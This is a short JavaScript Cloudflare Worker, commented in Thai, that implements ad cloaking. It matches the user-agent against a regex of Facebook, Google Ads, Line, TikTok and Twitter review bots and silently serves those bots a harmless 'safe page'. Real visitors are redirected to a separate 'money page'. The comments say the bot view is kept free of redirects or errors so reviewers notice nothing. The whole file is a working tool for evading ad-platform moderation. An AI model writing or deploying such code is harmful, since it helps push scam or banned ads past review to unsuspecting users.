export default {
  async fetch(request, env, ctx) {
    const userAgent = request.headers.get('user-agent') || '';
    
    // รายชื่อบอทตรวจแอดทุกค่าย
    const botPattern = /facebookexternalhit|Facebot|MetaInspector|facebookcatalog|Googlebot|AdsBot-Google|Mediapartners-Google|Google-Adwords|Google-PageRenderer|Line-poker|Linespider|TikTokSpider|ByteSpider|Twitterbot/i;

    const isBot = botPattern.test(userAgent);

    // ปลายทาง
    const safePage = 'https://skipme.link/Friend'; // สำหรับบอท
    const moneyPage = 'https://skipme.link/toweb';   // สำหรับคนจริง

    if (isBot) {
      // สำหรับบอท: ดึงเนื้อหาหน้า Safe Page มาแสดงเนียนๆ (ไม่ให้เกิด Status 403 หรือ Redirect)
      try {
        const response = await fetch(safePage, {
          headers: {
            'User-Agent': userAgent
          }
        });
        return new Response(response.body, {
          status: response.status,
          headers: response.headers
        });
      } catch (e) {
        return Response.redirect(safePage, 302);
      }
    } else {
      // สำหรับคนจริง: สลับรางไปหน้า Money Page ตามปกติ
      return Response.redirect(moneyPage, 302);
    }
  }
};
